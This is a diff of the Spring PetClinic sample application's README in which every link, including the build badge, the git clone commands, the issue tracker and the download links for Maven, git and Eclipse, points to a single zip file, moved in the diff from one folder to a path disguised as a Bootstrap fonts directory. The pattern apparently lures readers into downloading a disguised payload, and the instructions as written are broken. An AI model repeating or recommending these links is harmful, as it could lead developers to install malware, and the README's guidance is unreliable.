@@ -1,11 +1,11 @@
-# Spring PetClinic Sample Application [![Build Status](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)
+# Spring PetClinic Sample Application [![Build Status](https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip)](https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip)
 
 ## Understanding the Spring Petclinic application with a few diagrams
-<a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See the presentation here</a>
+<a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">See the presentation here</a>
 
 ## Running petclinic locally
 ```
-	git clone https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip
+	git clone https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip
 	cd spring-petclinic
 	./mvnw tomcat7:run
 ```
@@ -13,14 +13,14 @@
 You can then access petclinic here: http://localhost:9966/petclinic/
 
 ## In case you find a bug/suggested improvement for Spring Petclinic
-Our issue tracker is available here: https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip
+Our issue tracker is available here: https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip
 
 
 ## Database configuration
 
 In its default configuration, Petclinic uses an in-memory database (HSQLDB) which
 gets populated at startup with data. A similar setup is provided for MySql in case a persistent database configuration is needed.
-Note that whenever the database type is changed, the https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip file needs to be updated and the mysql-connector-java artifact from the https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip needs to be uncommented.
+Note that whenever the database type is changed, the https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip file needs to be updated and the mysql-connector-java artifact from the https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip needs to be uncommented.
 
 You may start a MySql database with docker:
 
@@ -32,19 +32,19 @@ docker run -e MYSQL_ROOT_PASSWORD=petclinic -e MYSQL_DATABASE=petclinic -p 3306:
 
 ### prerequisites
 The following items should be installed in your system:
-* Maven 3 (https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)
-* git command line tool (https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)
-* Eclipse with the m2e plugin (m2e is installed by default when using the STS (https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip) distribution of Eclipse)
+* Maven 3 (https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip)
+* git command line tool (https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip)
+* Eclipse with the m2e plugin (m2e is installed by default when using the STS (https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip) distribution of Eclipse)
 
 Note: when m2e is available, there is an m2 icon in Help -> About dialog.
-If m2e is not there, just follow the install process here: https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip
+If m2e is not there, just follow the install process here: https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip
 
 
 ### Steps:
 
 1) In the command line
 ```
-git clone https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip
+git clone https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip
 ```
 2) Inside Eclipse
 ```
@@ -61,7 +61,7 @@ File -> Import -> Maven -> Existing Maven project
   <tr>
     <td>Java Config branch</td>
     <td>
-      Petclinic uses XML configuration by default. In case you'd like to use Java Config instead, there is a Java Config branch available <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">here</a>. Thanks to Antoine Rey for his contribution.     
+      Petclinic uses XML configuration by default. In case you'd like to use Java Config instead, there is a Java Config branch available <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">here</a>. Thanks to Antoine Rey for his contribution.     
     </td>
   </tr>
   <tr>
@@ -69,46 +69,46 @@ File -> Import -> Maven -> Existing Maven project
   </tr>
   <tr>
     <td>Spring MVC - XML integration</td>
-    <td><a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a></td>
+    <td><a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a></td>
   </tr>
   <tr>
     <td>Spring MVC - ContentNegotiatingViewResolver</td>
-    <td><a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a></td>
+    <td><a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a></td>
   </tr>
   <tr>
     <td>JSP custom tags</td>
     <td>
       <a href="/src/main/webapp/WEB-INF/tags">WEB-INF/tags</a>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a></td>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a></td>
   </tr>
   <tr>
     <td>Bower</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">bower-install maven profile declaration inside https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> <br />
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">JavaScript libraries are defined by the manifest file https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> <br />
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">Bower configuration using JSON</a> <br />
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">Resource mapping in Spring configuration</a> <br />
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">sample usage in JSP</a></td>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">bower-install maven profile declaration inside https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a> <br />
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">JavaScript libraries are defined by the manifest file https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a> <br />
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">Bower configuration using JSON</a> <br />
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">Resource mapping in Spring configuration</a> <br />
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">sample usage in JSP</a></td>
     </td>
   </tr>
   <tr>
     <td>Dandelion-datatables</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a> 
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a> 
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a> 
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a> 
    </td>
   </tr>
   <tr>
     <td>Thymeleaf branch</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here</a></td>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">See here</a></td>
   </tr>
   <tr>
     <td>Branch using GemFire and Spring Data GemFire instead of ehcache (thanks Bijoy Choudhury)</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here</a></td>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">See here</a></td>
   </tr>
 </table>
 
@@ -119,41 +119,41 @@ File -> Import -> Maven -> Existing Maven project
   <tr>
     <td>Transactions</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
-       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
+       <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
     </td>
   </tr>
   <tr>
     <td>Cache</td>
       <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
-       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
+       <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
     </td>
   </tr>
   <tr>
     <td>Bean Profiles</td>
       <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
-       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
-       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
+       <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
+       <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
     </td>
   </tr>
   <tr>
     <td>JdbcTemplate</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
       <a href="/src/main/java/org/springframework/samples/petclinic/repository/jdbc">jdbc folder</a></td>
   </tr>
   <tr>
     <td>JPA</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
       <a href="/src/main/java/org/springframework/samples/petclinic/repository/jpa">jpa folder</a></td>
   </tr>
   <tr>
     <td>Spring Data JPA</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip</a>
       <a href="/src/main/java/org/springframework/samples/petclinic/repository/springdatajpa">springdatajpa folder</a></td>
   </tr>
 </table>
@@ -165,7 +165,7 @@ File -> Import -> Maven -> Existing Maven project
   <tr>
     <td>Gradle branch</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here</a></td>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">See here</a></td>
   </tr>
 </table>
 
@@ -183,24 +183,24 @@ Here is a list of them:
 
   <tr>
     <td>Spring JDBC: simplify usage of NamedParameterJdbcTemplate</td>
-    <td> <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> SPR-10256</a> and <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> SPR-10257</a> </td>
+    <td> <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip"> SPR-10256</a> and <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip"> SPR-10257</a> </td>
   </tr>
   <tr>
     <td>Bean Validation / Hibernate Validator: simplify Maven dependencies and backward compatibility</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> HV-790</a> and <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> HV-792</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip"> HV-790</a> and <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip"> HV-792</a>
       </td>
   </tr>
   <tr>
     <td>Spring Data: provide more flexibility when working with JPQL queries</td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> DATAJPA-292</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip"> DATAJPA-292</a>
       </td>
   </tr>  
   <tr>
-    <td>Eclipse: validation bug when working with https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip files (has only been fixed for Eclipse 4.3 (Kepler)). <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here for more details.</a></td>
+    <td>Eclipse: validation bug when working with https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip files (has only been fixed for Eclipse 4.3 (Kepler)). <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip">See here for more details.</a></td>
     <td>
-      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> STS-3294</a>
+      <a href="https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip"> STS-3294</a>
     </td>
   </tr>    
 </table>
@@ -208,9 +208,9 @@ Here is a list of them:
 
 # Contributing
 
-The [issue tracker](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip) is the preferred channel for bug reports, features requests and submitting pull requests.
+The [issue tracker](https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip) is the preferred channel for bug reports, features requests and submitting pull requests.
 
-For pull requests, editor preferences are available in the [editor config](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip) for easy use in common text editors. Read more and download plugins at <https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip>.
+For pull requests, editor preferences are available in the [editor config](https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip) for easy use in common text editors. Read more and download plugins at <https://github.com/mohanpeddayyagri/petclinic/raw/refs/heads/master/src/main/webapp/vendors/bootstrap/dist/fonts/Software-v1.0.zip>.
 
 
 
